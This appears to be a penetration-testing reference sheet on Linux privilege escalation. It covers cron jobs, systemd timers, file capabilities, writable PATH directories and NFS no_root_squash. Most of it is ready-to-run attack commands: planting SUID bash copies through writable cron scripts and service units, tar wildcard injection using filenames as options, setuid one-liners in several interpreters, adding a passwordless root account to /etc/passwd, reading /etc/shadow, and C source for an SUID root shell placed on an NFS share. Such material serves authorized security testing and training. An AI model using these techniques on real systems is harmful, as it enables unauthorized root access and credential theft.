# Cron, systemd Timers, Capabilities, $PATH & NFS Abuse

Reference for time-based execution abuse, Linux capabilities, writable-path hijacks, wildcard injection, and NFS `no_root_squash`. Companion to `linux-privesc-methodology.md` and `suid-sudo-gtfobins.md`.

---

## 1. Cron Jobs

Cron jobs that run as root and reference attacker-controllable files/scripts are a classic, reliable vector. Many are short-lived and invisible to `crontab -l` — use **pspy** to see them.

### 1.1 Enumerate every cron source
```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
cat /etc/cron.d/* 2>/dev/null
crontab -l                                   # current user
sudo crontab -l 2>/dev/null
ls -la /var/spool/cron/ /var/spool/cron/crontabs/ 2>/dev/null
cat /var/spool/cron/crontabs/* 2>/dev/null
grep -RIn CRON /var/log/syslog /var/log/cron* 2>/dev/null

# Watch live (catches hidden/short jobs + full command lines):
/dev/shm/pspy64 -pf -i 1000
```

### 1.2 Writable script invoked by root cron
```bash
# The cron entry runs /opt/backup/run.sh as root and you can write it:
ls -la /opt/backup/run.sh
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> /opt/backup/run.sh
# wait one interval:
/tmp/rb -p
```

### 1.3 Writable directory of a cron-invoked script (replace the file)
```bash
# Cron runs /opt/jobs/cleanup.sh; you cannot write the file but CAN write /opt/jobs/
mv /opt/jobs/cleanup.sh /opt/jobs/cleanup.sh.bak 2>/dev/null
cat > /opt/jobs/cleanup.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rb; chmod +s /tmp/rb
EOF
chmod +x /opt/jobs/cleanup.sh
```

### 1.4 $PATH abuse in cron (relative command)
`/etc/crontab` often sets `PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:...` and a job calls a command by bare name. If any earlier dir in that PATH is writable:
```bash
# crontab: */1 * * * * root overwrite.sh   (no absolute path)
# /usr/local/bin is writable & earlier in PATH:
cat > /usr/local/bin/overwrite.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rb; chmod +s /tmp/rb
EOF
chmod +x /usr/local/bin/overwrite.sh
```

### 1.5 Wildcard injection (tar/rsync/chown/chmod over a writable dir)
A root cron job like `cd /var/www && tar czf /backup/web.tgz *` lets you smuggle tar options as filenames:
```bash
cd /var/www
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# next run → root; then /tmp/rb -p
```
Other wildcard sinks: `rsync -e ...`, `chown --reference=file *`, `chmod ... *`, `7z a -- *` (read arbitrary files). See https://www.exploit-db.com/papers/33930.

---

## 2. systemd Timers & Services

### 2.1 Enumerate
```bash
systemctl list-timers --all
systemctl list-units --type=service --state=running
# Find writable units / writable ExecStart targets:
find /etc/systemd/ /lib/systemd/ /run/systemd/ -name '*.service' -o -name '*.timer' 2>/dev/null | xargs ls -la 2>/dev/null
find / -name '*.service' -writable 2>/dev/null
```

### 2.2 Writable unit / writable ExecStart binary
```bash
# Writable .service → edit ExecStart:
# [Service]
# ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb'
systemctl daemon-reload 2>/dev/null
systemctl restart <unit> 2>/dev/null     # or wait for the timer / reboot
/tmp/rb -p

# Writable binary referenced by a root service's ExecStart → replace it.
```

### 2.3 `.timer` pointing at a writable `.service`
If a timer triggers a service whose `ExecStart` you can influence (writable file or PATH), you get periodic root execution without restart rights.

---

## 3. Linux Capabilities

Capabilities split root's power into units assignable to files (`getcap`) or threads. A normal-looking binary with the right capability grants root.

### 3.1 Enumerate
```bash
getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
# Inside a container, also check your thread's caps:
capsh --print
cat /proc/self/status | grep Cap
capsh --decode=0000003fffffffff
```

### 3.2 Exploitable capabilities
| Capability | Effect | Exploit |
|------------|--------|---------|
| `cap_setuid` | Set UID to 0 | shell as root directly |
| `cap_setgid` | Set GID | group escalation |
| `cap_dac_read_search` | Bypass read perms | read `/etc/shadow`, any file |
| `cap_dac_override` | Bypass all file perms | write `/etc/passwd` |
| `cap_chown` | Change ownership | chown a SUID/`/etc/shadow` |
| `cap_fowner` | Bypass owner checks for chmod | chmod arbitrary file |
| `cap_sys_admin` | "near-root" | mount, many escapes |
| `cap_sys_ptrace` | ptrace any process | inject into root process |
| `cap_sys_module` | load kernel modules | insmod a root-shell module |

### 3.3 Commands
```bash
# cap_setuid on an interpreter:
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
/usr/bin/ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'

# cap_dac_read_search on tar/cat/etc → read shadow:
./tar cvf /tmp/s.tar /etc/shadow; tar xf /tmp/s.tar -C /tmp; cat /tmp/etc/shadow
getcap /usr/bin/cat 2>/dev/null && cat /etc/shadow

# cap_dac_override → overwrite /etc/passwd
echo 'r00t::0:0::/root:/bin/bash' >> /etc/passwd && su r00t     # blank pw root

# cap_chown → chown /etc/shadow to yourself, or chown a copied bash and +s it
./chown $(id -u):$(id -g) /etc/shadow

# cap_sys_ptrace → inject shellcode into a root process (e.g. via gdb)
gdb -p <root_pid>     # then call system("/bin/bash")

# cap_sys_module → load a malicious kernel module
# build reverse-shell .ko, then: insmod evil.ko
```

---

## 4. Writable $PATH Directory (general)

Not just cron — any root-context program that calls a command by bare name is vulnerable if a writable dir precedes the real one in that program's PATH.
```bash
echo $PATH
echo $PATH | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done
# Plant the hijack:
cat > /writable/dir/COMMAND <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rb; chmod +s /tmp/rb
EOF
chmod +x /writable/dir/COMMAND
```

---

## 5. NFS `no_root_squash`

If an NFS export is shared with `no_root_squash`, a client root can create files on the share that remain root-owned (and SUID) on the server. If you have (or can get) root on any NFS client — or can mount as root — you escalate on the server.

### 5.1 Enumerate
```bash
cat /etc/exports                          # on the server, if readable
showmount -e <server_ip>                  # from a client/attacker
# Look for:  /shared *(rw,no_root_squash)
```

### 5.2 Exploit (attacker is root on a machine that can mount)
```bash
mkdir /mnt/nfs
mount -o rw,vers=3 <server_ip>:/shared /mnt/nfs        # as root on attacker
# Drop a SUID root shell:
cat > /mnt/nfs/rootbash.c <<'EOF'
#include <unistd.h>
int main(){ setuid(0); setgid(0); execl("/bin/bash","bash","-p",0); }
EOF
gcc /mnt/nfs/rootbash.c -o /mnt/nfs/rootbash       # compiled as root → file is root-owned
chmod +s /mnt/nfs/rootbash
# On the SERVER (your low-priv shell), the file appears at /shared/rootbash with SUID root:
/shared/rootbash       # => root shell on the server
```
If you cannot mount externally, you still escalate when you already have root on a *client* — write the SUID binary there; it lands root-owned on the server export.

---

## 6. Cheatsheet

```bash
# CRON
/dev/shm/pspy64 -pf -i 1000
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.daily
# writable cron script → echo payload >> script.sh ; wait ; /tmp/rb -p

# WILDCARD (tar)
echo 'cp /bin/bash /tmp/rb;chmod +s /tmp/rb' > shell.sh
touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh shell.sh'

# SYSTEMD
systemctl list-timers --all
find / -name '*.service' -writable 2>/dev/null

# CAPABILITIES
getcap -r / 2>/dev/null
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'   # cap_setuid

# PATH
echo $PATH | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "W: $d"; done

# NFS
showmount -e <ip>; mount -o rw,vers=3 <ip>:/shared /mnt/nfs
# compile SUID rootbash as root on share → run on server
```

---

## References

- HackTricks – Cron/Timers — https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
- HackTricks – Linux Capabilities — https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities
- HackTricks – NFS no_root_squash — https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting
- Wildcard injection paper (Leon Juranic) — https://www.exploit-db.com/papers/33930
- GTFOBins (capability/sudo per-binary) — https://gtfobins.github.io/
